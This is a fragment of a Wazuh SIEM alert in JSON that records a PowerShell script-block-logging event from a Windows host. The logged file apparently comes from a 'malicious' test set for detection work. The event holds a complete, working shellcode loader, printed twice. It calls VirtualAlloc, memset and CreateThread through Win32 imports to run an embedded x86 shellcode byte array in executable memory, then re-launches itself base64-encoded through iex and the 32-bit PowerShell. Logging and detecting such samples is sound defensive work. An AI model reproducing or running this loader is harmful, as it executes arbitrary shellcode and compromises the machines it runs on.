powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304510.4114941","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:22:11.2649895Z","eventRecordID":"145844","processID":"6696","threadID":"7108","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$pQW1q0 = '$BiLa = ''[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $BiLa -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbb,0xb9,0xbf,0x14,0x1a,0xd9,0xf6,0xd9,0x74,0x24,0xf4,0x58,0x2b,0xc9,0xb1,0x59,0x31,0x58,0x13,0x83,0xc0,0x04,0x03,0x58,0xb6,0x5d,0xe1,0xe6,0x20,0x23,0x0a,0x17,0xb0,0x44,0x82,0xf2,0x81,0x44,0xf0,0x77,0xb1,0x74,0x72,0xd5,0x3d,0xfe,0xd6,0xce,0xb6,0x72,0xff,0xe1,0x7f,0x38,0xd9,0xcc,0x80,0x11,0x19,0x4e,0x02,0x68,0x4e,0xb0,0x3b,0xa3,0x83,0xb1,0x7c,0xde,0x6e,0xe3,0xd5,0x94,0xdd,0x14,0x52,0xe0,0xdd,0x9f,0x28,0xe4,0x65,0x43,0xf8,0x07,0x47,0xd2,0x73,0x5e,0x47,0xd4,0x50,0xea,0xce,0xce,0xb5,0xd7,0x99,0x65,0x0d,0xa3,0x1b,0xac,0x5c,0x4c,0xb7,0x91,0x51,0xbf,0xc9,0xd6,0x55,0x20,0xbc,0x2e,0xa6,0xdd,0xc7,0xf4,0xd5,0x39,0x4d,0xef,0x7d,0xc9,0xf5,0xcb,0x7c,0x1e,0x63,0x9f,0x72,0xeb,0xe7,0xc7,0x96,0xea,0x24,0x7c,0xa2,0x67,0xcb,0x53,0x23,0x33,0xe8,0x77,0x68,0xe7,0x91,0x2e,0xd4,0x46,0xad,0x31,0xb7,0x37,0x0b,0x39,0x55,0x23,0x26,0x60,0x31,0xdd,0x5c,0xef,0xc1,0x49,0xe8,0x66,0xaf,0xe0,0x42,0x11,0x63,0x84,0x4c,0xe6,0x84,0xbf,0xa0,0x33,0x29,0x13,0x90,0x90,0x9e,0xfb,0x2c,0x41,0x59,0x5b,0xaf,0xb8,0xca,0xf0,0x3a,0x40,0xbf,0xa5,0xd2,0x36,0x28,0x4a,0x23,0x5f,0xda,0x4a,0x23,0x9f,0xcd,0x0f,0x16,0xda,0x23,0xfb,0x58,0xb4,0x2b,0xac,0xd1,0xab,0x6d,0xad,0x37,0x5a,0xb7,0x01,0xd0,0x5d,0x05,0x46,0xa4,0x0d,0x3a,0xd5,0xf2,0xe2,0xea,0xb1,0x17,0x51,0x3c,0x79,0x17,0x8f,0xd6,0x17,0xed,0x6f,0xbe,0x67,0xc2,0x8f,0x3e,0xe1,0xc5,0xfa,0x3a,0xa1,0x6f,0xe4,0x14,0x29,0x05,0x5c,0x06,0x2f,0x1a,0xb5,0x65,0x63,0xb6,0x65,0xdf,0xeb,0x15,0x8c,0xc7,0x90,0x9a,0x45,0x72,0xa6,0x10,0x6c,0x33,0x52,0x02,0x18,0x3b,0x29,0x16,0x8f,0x44,0x87,0x3d,0x70,0xd2,0x28,0xd2,0x70,0x22,0x41,0xd2,0x70,0x62,0x91,0x81,0x18,0x3a,0x35,0x76,0x3c,0x45,0xe0,0xea,0xed,0xea,0x82,0xea,0x45,0x64,0x95,0xd4,0x69,0x74,0xc6,0x42,0x02,0x66,0x7e,0xe3,0x30,0x79,0xab,0x71,0x74,0xf1,0x99,0xf1,0x72,0xf8,0xe2,0x83,0xbd,0x8f,0x01,0xd3,0xfe,0x30,0x22,0x91,0xff,0x31,0x4d,0x3e,0x65,0xbb,0xdb,0xdc,0x00,0x2b,0x7d,0x40,0xa0,0xce,0x19,0xa8,0x52,0x74,0x8c,0xc7,0xb4,0x1a,0x35,0x5c,0xc9;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$cz5=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($cz5.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$cz5,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($pQW1q0));$pQW = \"-e \";if([IntPtr]::Size -eq 8){$6hAf = $env:SystemRoot + \"\\syswow64\\WindowsPowerShell\\v1.0\\powershell\";iex \"& $6hAf $pQW $e\"}else{;iex \"& powershell $pQW $e\";}\r\n\r\nScriptBlock ID: 0c476793-99ca-4f04-a2b5-320109b50f75\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\410.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$pQW1q0 = '$BiLa = ''[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $BiLa -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbb,0xb9,0xbf,0x14,0x1a,0xd9,0xf6,0xd9,0x74,0x24,0xf4,0x58,0x2b,0xc9,0xb1,0x59,0x31,0x58,0x13,0x83,0xc0,0x04,0x03,0x58,0xb6,0x5d,0xe1,0xe6,0x20,0x23,0x0a,0x17,0xb0,0x44,0x82,0xf2,0x81,0x44,0xf0,0x77,0xb1,0x74,0x72,0xd5,0x3d,0xfe,0xd6,0xce,0xb6,0x72,0xff,0xe1,0x7f,0x38,0xd9,0xcc,0x80,0x11,0x19,0x4e,0x02,0x68,0x4e,0xb0,0x3b,0xa3,0x83,0xb1,0x7c,0xde,0x6e,0xe3,0xd5,0x94,0xdd,0x14,0x52,0xe0,0xdd,0x9f,0x28,0xe4,0x65,0x43,0xf8,0x07,0x47,0xd2,0x73,0x5e,0x47,0xd4,0x50,0xea,0xce,0xce,0xb5,0xd7,0x99,0x65,0x0d,0xa3,0x1b,0xac,0x5c,0x4c,0xb7,0x91,0x51,0xbf,0xc9,0xd6,0x55,0x20,0xbc,0x2e,0xa6,0xdd,0xc7,0xf4,0xd5,0x39,0x4d,0xef,0x7d,0xc9,0xf5,0xcb,0x7c,0x1e,0x63,0x9f,0x72,0xeb,0xe7,0xc7,0x96,0xea,0x24,0x7c,0xa2,0x67,0xcb,0x53,0x23,0x33,0xe8,0x77,0x68,0xe7,0x91,0x2e,0xd4,0x46,0xad,0x31,0xb7,0x37,0x0b,0x39,0x55,0x23,0x26,0x60,0x31,0xdd,0x5c,0xef,0xc1,0x49,0xe8,0x66,0xaf,0xe0,0x42,0x11,0x63,0x84,0x4c,0xe6,0x84,0xbf,0xa0,0x33,0x29,0x13,0x90,0x90,0x9e,0xfb,0x2c,0x41,0x59,0x5b,0xaf,0xb8,0xca,0xf0,0x3a,0x40,0xbf,0xa5,0xd2,0x36,0x28,0x4a,0x23,0x5f,0xda,0x4a,0x23,0x9f,0xcd,0x0f,0x16,0xda,0x23,0xfb,0x58,0xb4,0x2b,0xac,0xd1,0xab,0x6d,0xad,0x37,0x5a,0xb7,0x01,0xd0,0x5d,0x05,0x46,0xa4,0x0d,0x3a,0xd5,0xf2,0xe2,0xea,0xb1,0x17,0x51,0x3c,0x79,0x17,0x8f,0xd6,0x17,0xed,0x6f,0xbe,0x67,0xc2,0x8f,0x3e,0xe1,0xc5,0xfa,0x3a,0xa1,0x6f,0xe4,0x14,0x29,0x05,0x5c,0x06,0x2f,0x1a,0xb5,0x65,0x63,0xb6,0x65,0xdf,0xeb,0x15,0x8c,0xc7,0x90,0x9a,0x45,0x72,0xa6,0x10,0x6c,0x33,0x52,0x02,0x18,0x3b,0x29,0x16,0x8f,0x44,0x87,0x3d,0x70,0xd2,0x28,0xd2,0x70,0x22,0x41,0xd2,0x70,0x62,0x91,0x81,0x18,0x3a,0x35,0x76,0x3c,0x45,0xe0,0xea,0xed,0xea,0x82,0xea,0x45,0x64,0x95,0xd4,0x69,0x74,0xc6,0x42,0x02,0x66,0x7e,0xe3,0x30,0x79,0xab,0x71,0x74,0xf1,0x99,0xf1,0x72,0xf8,0xe2,0x83,0xbd,0x8f,0x01,0xd3,0xfe,0x30,0x22,0x91,0xff,0x31,0x4d,0x3e,0x65,0xbb,0xdb,0xdc,0x00,0x2b,0x7d,0x40,0xa0,0xce,0x19,0xa8,0x52,0x74,0x8c,0xc7,0xb4,0x1a,0x35,0x5c,0xc9;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$cz5=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($cz5.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$cz5,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($pQW1q0));$pQW = \\\"-e \\\";if([IntPtr]::Size -eq 8){$6hAf = $env:SystemRoot + \\\"\\\\syswow64\\\\WindowsPowerShell\\\\v1.0\\\\powershell\\\";iex \\\"&amp; $6hAf $pQW $e\\\"}else{;iex \\\"&amp; powershell $pQW $e\\\";}","scriptBlockId":"0c476793-99ca-4f04-a2b5-320109b50f75","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\410.ps1"}}},"location":"EventChannel"}
